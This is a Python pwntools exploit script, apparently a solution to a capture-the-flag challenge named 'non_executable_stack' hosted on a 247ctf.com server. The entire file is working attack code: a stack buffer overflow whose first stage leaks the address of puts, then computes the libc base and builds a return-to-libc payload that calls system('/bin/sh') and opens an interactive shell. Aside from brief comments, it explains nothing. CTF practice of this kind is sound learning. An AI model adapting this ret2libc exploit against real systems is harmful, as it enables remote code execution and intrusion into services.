#!/usr/bin/python
from pwn import *
#local instance
exe = context.binary = ELF('./non_executable_stack')
#remote connection
p = remote('afab2f3f4f6f4743.247ctf.com' , 50137)

#leaking puts from the remote server

leak = 'A'*44 # padding 
leak += p32(exe.plt['puts']) #plt entry of puts
leak += p32(exe.symbols['main']) 
leak += p32(exe.got['puts']) #passing got entry of puts to puts
print p.recvline()
print ("stage 1 payload.....")
p.sendline(leak)
print p.recvline()
puts_leak = u32(p.recvline()[:4]) # leaking puts
log.info("puts leak : {}".format(hex(puts_leak))) 
libc = ELF('./libc6-i386_2.27-3ubuntu1_amd64.so')
libc_base = puts_leak - libc.symbols['puts'] # calculating the BASE of libc 
system = libc_base + libc.symbols['system'] # finding system
exit = libc_base + libc.symbols['exit'] # exit
shell = libc_base + next(libc.search('/bin/sh\x00')) # shell
log.info('system address : {}'.format(hex(system)))
log.info('libc base found : {}'.format(hex(libc_base)))
log.info('shell found at : {}'.format(hex(shell)))
print "PREPARING FINAL PAYLOAD........"

final = 'A'*44 # chaining final payload
final += p32(system)
final += p32(exit)
final += p32(shell)
log.info("sending stage 2 payload.....")
p.sendline(final)
log.info("checking for connection.....")
p.interactive()
